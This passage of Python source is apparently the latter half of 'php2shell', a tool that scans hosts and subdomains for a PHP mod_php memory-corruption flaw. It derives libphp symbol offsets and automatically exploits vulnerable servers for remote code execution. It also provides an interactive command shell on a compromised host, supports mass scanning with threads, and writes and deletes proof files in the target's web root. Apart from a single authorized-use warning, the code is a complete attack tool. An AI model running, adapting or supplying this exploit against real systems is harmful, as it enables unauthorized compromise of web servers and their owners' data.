            p_memsz = struct.unpack_from("<Q", data, offset + 40)[0]
            if p_type == 1 and p_memsz:
                loads.append(p_vaddr)
        if not loads:
            return None, None
        bias = min(loads)
        sections = []
        for index in range(e_shnum):
            offset = e_shoff + index * e_shentsize
            sh_name, sh_type = struct.unpack_from("<II", data, offset)
            sh_offset, sh_size = struct.unpack_from("<QQ", data, offset + 24)
            sh_link = struct.unpack_from("<I", data, offset + 40)[0]
            sh_entsize = struct.unpack_from("<Q", data, offset + 56)[0]
            sections.append(
                (sh_name, sh_type, sh_offset, sh_size, sh_link, sh_entsize)
            )
        wanted = {"zif_system": None, "zval_ptr_dtor": None}
        for _name, sh_type, sh_offset, sh_size, sh_link, sh_entsize in sections:
            if sh_type not in (2, 11) or sh_link >= len(sections):
                continue
            strtab_offset = sections[sh_link][2]
            entsize = sh_entsize or 24
            for index in range(sh_size // entsize):
                offset = sh_offset + index * entsize
                st_name = struct.unpack_from("<I", data, offset)[0]
                st_value = struct.unpack_from("<Q", data, offset + 8)[0]
                if not st_name:
                    continue
                start = strtab_offset + st_name
                end = data.find(b"\x00", start)
                name = data[start:end].decode("ascii", "replace")
                if name in wanted and wanted[name] is None:
                    wanted[name] = st_value
        zif = wanted["zif_system"]
        dtor = wanted["zval_ptr_dtor"]
        if zif is None or dtor is None:
            print("[-] libphp symbols not found", file=sys.stderr)
            return None, None
        return zif - bias, dtor - bias
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass


def platform_guard(server: str) -> Optional[str]:
    lowered = (server or "").lower()
    if "microsoft-iis" in lowered or "win32" in lowered or "win64" in lowered:
        return "IIS/Windows target; the exploit needs Linux Apache mod_php prefork"
    if "nginx" in lowered:
        return "nginx target; PHP runs as FPM/FastCGI, not mod_php prefork"
    return None


def exploit_host(result: ScanResult, args: argparse.Namespace) -> Optional[Session]:
    guard = platform_guard(result.server)
    if guard:
        print(f"    [!] {guard}", file=sys.stderr)
        return None
    target = Target(result.url, timeout=args.exploit_timeout, insecure=args.insecure)
    session = Session(
        target,
        zif_offset=args.zif_offset,
        dtor_offset=args.dtor_offset,
        htdata_offset=args.htdata_offset,
        proof_name=args.proof_name,
        retries=args.retries,
        verbose=args.verbose,
    )
    command = f"id>./{args.proof_name}"
    print(f"[*] exploiting {result.url} (command: {command})", file=sys.stderr)
    output = session.execute(command)
    if output is None:
        print(
            "    [!] RCE not confirmed (the target build, config or writable "
            "web root may not match; see --zif-offset/--dtor-offset)",
            file=sys.stderr,
        )
        return None
    text = output.decode("utf-8", "replace").strip()
    if text:
        print(text, flush=True)
    else:
        print("[*] RCE confirmed, command produced no output", file=sys.stderr)
    if not args.no_cleanup:
        cleanup = f"rm ./{args.proof_name}"
        print(f"[*] removing proof file ({cleanup})", file=sys.stderr)
        session.execute(cleanup, want_output=False, attempts=2)
    return session


def shell_loop(session: Session, proof_name: str) -> None:
    print(
        "\n[shell] Commands are executed through the exploit. The command must "
        f"be at most {MAX_CMD - len('./' + proof_name) - 1} bytes because output "
        "is redirected to ./" + proof_name + ".\n"
        "[shell] This is a command console, not an interactive TTY. "
        "Type exit or quit to leave.",
        file=sys.stderr,
    )
    while True:
        try:
            line = input("php2shell> ")
        except (EOFError, KeyboardInterrupt):
            print(file=sys.stderr)
            break
        command = line.strip()
        if not command:
            continue
        if command in ("exit", "quit"):
            break
        if ">" in command or "|" in command or "\n" in command:
            print("[!] redirection and pipes are not supported", file=sys.stderr)
            continue
        full = f"{command}>./{proof_name}"
        if len(full.encode()) > MAX_CMD:
            limit = MAX_CMD - len(f"./{proof_name}") - 1
            print(f"[!] command too long; maximum is {limit} bytes", file=sys.stderr)
            continue
        try:
            output = session.execute(full)
        except ValueError as exc:
            print(f"[!] {exc}", file=sys.stderr)
            continue
        if output is None:
            print("[!] no output retrieved (worker or proof file unavailable)", file=sys.stderr)
            continue
        text = output.decode("utf-8", "replace").rstrip()
        print(text if text else "[no output]")
    print("[shell] leaving; proof file ./%s may remain" % proof_name, file=sys.stderr)


def load_targets(path: str) -> list[str]:
    targets = []
    for line in Path(path).read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        targets.append(line.split(",")[0].split()[0])
    return targets


def enumerate_subdomains(domain: str, timeout: float, scheme: str) -> list[str]:
    domain = domain.strip().lower().strip(".")
    if not domain or "." not in domain:
        raise ValueError("--domain requires a fully qualified domain name")
    query = urllib.parse.quote(f"%.{domain}", safe="")
    url = f"https://crt.sh/?q={query}&output=json"
    request = urllib.request.Request(
        url, headers={"User-Agent": DEFAULT_USER_AGENT, "Accept": "application/json"}
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            payload = json.loads(response.read().decode("utf-8", "replace"))
    except (urllib.error.URLError, TimeoutError, ValueError) as exc:
        raise ValueError(f"crt.sh lookup failed: {exc}") from exc
    names = set()
    suffix = "." + domain
    for entry in payload if isinstance(payload, list) else []:
        if not isinstance(entry, dict):
            continue
        for raw in str(entry.get("name_value", "")).splitlines():
            name = raw.strip().lower().lstrip("*.").rstrip(".")
            if (name == domain or name.endswith(suffix)) and not any(
                character in name for character in " /\\@:"
            ):
                names.add(name)
    return [f"{scheme}://{name}" for name in sorted(names)]


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Scan for php2shell and verify RCE by printing id output",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s -f subdomains.txt
  %(prog)s -f subdomains.txt --fast --workers 24
  %(prog)s -f subdomains.txt --safe --no-exploit
  %(prog)s -u https://target/ --shell
  %(prog)s -f hosts.txt --container php2shell-target

High-confidence hosts (unpatched version, PHPSESSID leak, or session
destruction failure) are exploited automatically. Hosts that only crash on
the probe are reported LIKELY and are not exploited unless --exploit-likely
is given. --rate limits outbound requests; 429/503 responses are retried
with Retry-After backoff.

The exploit defaults are calibrated for php:8.4.26-apache (mod_php prefork).
Other builds need matching offsets:
  --zif-offset 0x... --dtor-offset 0x... --htdata-offset 0x...
--container derives zif/dtor offsets from a local lab container. The stage
calibration is still 8.4.26; 8.5.x needs recalibration.
""",
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="single URL/host")
    group.add_argument("-f", "--file", help="file of hosts/URLs, one per line")
    group.add_argument("--domain", help="enumerate subdomains via crt.sh")
    parser.add_argument(
        "--scheme", choices=("https", "http"), default="https", help="scheme for --domain"
    )
    parser.add_argument("--path", default="/", help="path to test (default: /)")
    parser.add_argument("--workers", type=int, default=16, help="scan threads (default: 16)")
    parser.add_argument("--timeout", type=float, default=30.0, help="HTTP timeout (seconds)")
    parser.add_argument(
        "--rate",
        type=float,
        default=25.0,
        help="global scan requests per second, 0 = unlimited (default: 25)",
    )
    parser.add_argument(
        "--jitter",
        type=float,
        default=0.15,
        help="request pacing jitter, 0-0.5 (default: 0.15)",
    )
    parser.add_argument(
        "--max-probe-mb",
        type=int,
        default=8,
        help="largest active probe to send, 1-20 MiB (default: 8)",
    )
    parser.add_argument(
        "--fast",
        action="store_true",
        help="send only the 1 MiB probe for hosts without an advertised version",
    )
    parser.add_argument(
        "--exploit-timeout", type=float, default=30.0, help="exploit socket timeout"
    )
    parser.add_argument("-k", "--insecure", action="store_true", help="skip TLS verification")
    parser.add_argument(
        "--safe", action="store_true", help="version fingerprint only; no OOM probes"
    )
    parser.add_argument("--no-exploit", action="store_true", help="scan only")
    parser.add_argument(
        "--exploit-likely",
        action="store_true",
        help="also exploit LIKELY hosts (multipart-specific crash without a "
        "strong signal); off by default to avoid false positives",
    )
    parser.add_argument(
        "--exploit-delay",
        type=float,
        default=1.0,
        help="seconds between exploitation of different hosts (default: 1.0)",
    )
    parser.add_argument(
        "--shell",
        action="store_true",
        help="open a command console on the verified host (single target only)",
    )
    parser.add_argument("--retries", type=int, default=3, help="exploit retries per stage")
    parser.add_argument(
        "--zif-offset", type=lambda value: int(value, 0), default=ZIF_OFFSET_DEFAULT
    )
    parser.add_argument(
        "--dtor-offset", type=lambda value: int(value, 0), default=DTOR_OFFSET_DEFAULT
    )
    parser.add_argument(
        "--htdata-offset", type=lambda value: int(value, 0), default=BOOKWORM["htdata_offset"]
    )
    parser.add_argument(
        "--container",
        help="local docker container to read libphp offsets from (overrides offsets)",
    )
    parser.add_argument(
        "--proof-name",
        default="z" + format(secrets.randbelow(16), "x"),
        help="proof file name in the web root (default: random zN)",
    )
    parser.add_argument(
        "--no-cleanup", action="store_true", help="leave the proof file on target"
    )
    parser.add_argument("-v", "--verbose", action="store_true")
    return parser


def main() -> int:
    global PACER
    args = build_parser().parse_args()
    if args.workers < 1:
        raise SystemExit("--workers must be at least 1")
    if args.rate < 0:
        raise SystemExit("--rate must be 0 or positive")
    if not 0.0 <= args.jitter <= 0.5:
        raise SystemExit("--jitter must be between 0 and 0.5")
    if not 1 <= args.max_probe_mb <= 20:
        raise SystemExit("--max-probe-mb must be between 1 and 20")
    if args.exploit_delay < 0:
        raise SystemExit("--exploit-delay must be 0 or positive")
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,8}", args.proof_name):
        raise SystemExit("--proof-name must be 1-8 chars: letters, digits, _ . -")
    if len(f"./{args.proof_name}") + 2 >= MAX_CMD:
        raise SystemExit("--proof-name is too long for the 14-byte command limit")

    if args.shell and not args.url:
        raise SystemExit("--shell requires a single -u/--url target")
    if args.shell and args.no_exploit:
        raise SystemExit("--shell cannot be combined with --no-exploit")
    if args.fast:
        args.max_probe_mb = 1

    if args.container:
        zif, dtor = derive_offsets_from_container(args.container)
        if zif is None or dtor is None:
            raise SystemExit("could not derive offsets from the container")
        args.zif_offset, args.dtor_offset = zif, dtor

    if args.domain:
        targets = enumerate_subdomains(args.domain, args.timeout, args.scheme)
    elif args.url:
        targets = [args.url]
    else:
        targets = load_targets(args.file)
    seen = set()
    targets = [t for t in targets if not (t in seen or seen.add(t))]
    if not targets:
        raise SystemExit("no targets")

    PACER = Pacer(args.rate, args.jitter)
    print(
        f"[*] scanning {len(targets)} target(s) with {args.workers} workers, "
        f"{int(args.rate) if args.rate else 'unlimited'} req/s, "
        f"{'version only' if args.safe else 'max ' + str(args.max_probe_mb) + ' MiB probes'}",
        file=sys.stderr,
    )
    print(
        "[!] active mode and exploitation are intrusive; use only on authorized "
        "systems",
        file=sys.stderr,
    )

    if len(targets) > 1 and not args.safe:
        for probe in PROBES:
            if probe[0] <= args.max_probe_mb:
                build_probe_body(*probe)

    high: list[ScanResult] = []
    likely: list[ScanResult] = []
    reported: set[str] = set()
    with ThreadPoolExecutor(max_workers=min(args.workers, len(targets))) as executor:
        futures = {executor.submit(scan_target, target, args): target for target in targets}
        for index, future in enumerate(as_completed(futures), start=1):
            result = future.result()
            if result.vulnerable:
                high.append(result)
            elif result.likely:
                likely.append(result)
            state = (
                "VULNERABLE"
                if result.vulnerable
                else "LIKELY"
                if result.likely
                else result.verdict
            )
            print(
                f"[*] {index}/{len(targets)} {result.url}: {state} "
                f"(confidence {result.confidence})",
                file=sys.stderr,
            )
            if args.verbose and result.reason:
                print(f"    {result.reason}", file=sys.stderr)

            should_exploit = result.vulnerable or (
                args.exploit_likely and result.likely
            )
            if should_exploit and not args.no_exploit and not args.shell:
                if result.url not in reported:
                    print(result.url, flush=True)
                    reported.add(result.url)
                exploit_host(result, args)
                if args.exploit_delay:
                    time.sleep(args.exploit_delay)
            elif result.vulnerable and args.no_exploit and result.url not in reported:
                print(result.url, flush=True)
                reported.add(result.url)

    if args.shell:
        if not high:
            print("[-] no high-confidence host; shell not started", file=sys.stderr)
            return 0
        result = high[0]
        print(result.url, flush=True)
        session = exploit_host(result, args)
        if session is None:
            print("[-] exploit failed; shell not started", file=sys.stderr)
            return 1
        shell_loop(session, args.proof_name)
        if not args.no_cleanup:
            try:
                session.execute(
                    f"rm ./{args.proof_name}", want_output=False, attempts=2
                )
            except ValueError:
                pass
        return 1

    if not high and not (args.exploit_likely and likely):
        if likely:
            print(
                f"[*] {len(likely)} LIKELY host(s) need --exploit-likely to test; "
                "no high-confidence host found",
                file=sys.stderr,
            )
        else:
            print("[*] no vulnerable hosts", file=sys.stderr)
        return 0

    print(
        f"[*] done: {len(high)} high-confidence, {len(likely)} likely",
        file=sys.stderr,
    )
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
